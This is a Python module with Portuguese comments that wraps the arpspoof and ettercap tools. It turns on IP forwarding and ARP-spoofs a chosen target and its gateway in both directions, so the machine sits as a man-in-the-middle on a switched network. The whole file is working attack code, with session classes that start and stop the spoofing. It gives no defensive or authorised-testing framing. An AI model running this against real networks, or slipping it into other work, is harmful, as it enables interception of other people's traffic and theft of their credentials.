"""
ARP MITM session manager.
Requer: sudo pacman -S dsniff  (arpspoof)
        sudo pacman -S ettercap (alternativa mais poderosa)
"""

import subprocess
import time
from pathlib import Path


FORWARD_PATH = Path("/proc/sys/net/ipv4/ip_forward")


def _check_dep(binary: str) -> bool:
    return subprocess.run(["which", binary], capture_output=True).returncode == 0


class ARPMITMSession:
    """
    ARP spoofing bidirecional para posicionar a máquina como MITM
    entre um alvo e o gateway em rede switched.
    """

    def __init__(self, interface: str, target_ip: str, gateway_ip: str, wait_s: float = 5.0):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self._procs: list[subprocess.Popen] = []
        self._forwarding_was: str = "0"
        self.active = False
        self.wait_s = wait_s

    def _enable_forwarding(self):
        self._forwarding_was = FORWARD_PATH.read_text().strip()
        subprocess.run(
            ["sudo", "tee", str(FORWARD_PATH)],
            input="1\n",
            capture_output=True,
            text=True,
        )

    def _restore_forwarding(self):
        subprocess.run(
            ["sudo", "tee", str(FORWARD_PATH)],
            input=f"{self._forwarding_was}\n",
            capture_output=True,
            text=True,
        )

    def start(self, wait_s: float = 2.0) -> bool:
        if not _check_dep("arpspoof"):
            raise RuntimeError("arpspoof não encontrado. Instala: sudo pacman -S dsniff")

        try:
            self._enable_forwarding()
            print(f"[ARPSPOOF] Spoofing {self.target_ip} -> {self.gateway_ip}")

            p1 = subprocess.Popen(
                ["sudo", "arpspoof", "-i", self.interface, "-t", self.target_ip, self.gateway_ip],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            p2 = subprocess.Popen(
                ["sudo", "arpspoof", "-i", self.interface, "-t", self.gateway_ip, self.target_ip],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            self._procs = [p1, p2]
            
            time.sleep(1)
            if p1.poll():
                err = p1.stderr.read().decode() if p1.stderr else ""
                print(f"[ARPSPOOF] p1 error: {err}")
            if p2.poll():
                err = p2.stderr.read().decode() if p2.stderr else ""
                print(f"[ARPSPOOF] p2 error: {err}")
            
            self.active = True
            time.sleep(self.wait_s - 1)
            return True

        except Exception as e:
            self.stop()
            raise RuntimeError(f"Falha ao iniciar MITM: {e}") from e

    def stop(self):
        for p in self._procs:
            try:
                p.terminate()
                p.wait(timeout=3)
            except Exception:
                p.kill()
        self._procs = []
        self.active = False
        self._restore_forwarding()

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *_):
        self.stop()


class EttercapMITMSession:
    """Alternativa usando ettercap."""

    def __init__(self, interface: str, target_ip: str, gateway_ip: str):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self._proc: subprocess.Popen | None = None
        self.active = False

    def start(self, wait_s: float = 3.0) -> bool:
        if not _check_dep("ettercap"):
            raise RuntimeError("ettercap não encontrado. Instala: sudo pacman -S ettercap")

        target1 = f"/{self.gateway_ip}/"
        target2 = f"/{self.target_ip}/"

        cmd = ["sudo", "ettercap", "-T", "-q", "-i", self.interface, "-M", "arp:remote", target1, target2]

        self._proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.active = True
        time.sleep(wait_s)
        return True

    def stop(self):
        if self._proc:
            self._proc.terminate()
            try:
                self._proc.wait(timeout=5)
            except Exception:
                self._proc.kill()
        self._proc = None
        self.active = False

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *_):
        self.stop()


def check_mitm_deps() -> dict[str, bool]:
    return {
        "arpspoof": _check_dep("arpspoof"),
        "ettercap": _check_dep("ettercap"),
        "ip_forward": FORWARD_PATH.exists(),
    }
